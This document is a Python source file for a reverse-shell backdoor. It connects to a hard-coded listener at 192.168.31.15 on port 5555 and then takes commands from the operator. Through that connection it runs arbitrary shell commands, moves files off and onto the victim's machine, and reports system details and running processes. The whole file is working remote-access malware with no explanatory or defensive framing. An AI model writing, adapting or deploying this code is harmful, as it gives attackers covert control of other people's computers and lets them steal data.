import socket
import time
import subprocess
import json
import os
import platform
def reliable_send(data):
        jsondata = json.dumps(data)
        s.send(jsondata.encode())

def reliable_recv():
        data = ''
        while True:
                try:
                        data = data + s.recv(1024).decode().rstrip()
                        return json.loads(data)
                except ValueError:
                        continue




def connection():
	while True:
		time.sleep(15)
		try:
			s.connect(('192.168.31.15',5555))
			shell()
			s.close()
			break
		except:
			connection()

def upload_file(file_name):
	f = open(file_name, 'rb')
	s.send(f.read())


def download_file(file_name):
        f = open(file_name, 'wb')
        s.settimeout(1)
        chunk = s.recv(1024)
        while chunk:
                f.write(chunk)
                try:
                        chunk = s.recv(1024)
                except socket.timeout as e:
                        break
        s.settimeout(None)
        f.close()



# Function to retrieve system information
def get_system_info():
    system_info = {
        "System": platform.system(),
        "Node Name": platform.node(),
        "Release": platform.release(),
        "Version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor()
    }
    return system_info

# Function to retrieve process list
def get_process_list():
    # Execute 'tasklist' command to retrieve process list
    tasklist_output = subprocess.check_output("tasklist", shell=True).decode()
    lines = tasklist_output.split('\n')
    processes = []
    for line in lines[3:]:
        if line.strip():
            parts = line.split()
            processes.append({"pid": parts[1], "name": parts[0]})
    return processes

# Modify the shell function to handle 'systeminfo' and 'processes' commands
def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'clear':
            pass
        elif command == 'systeminfo':  # If command is 'systeminfo'
            system_info = get_system_info()
            reliable_send(system_info)
        elif command == 'processes':  # If command is 'processes'
            process_list = get_process_list()
            reliable_send(process_list)
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)




s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
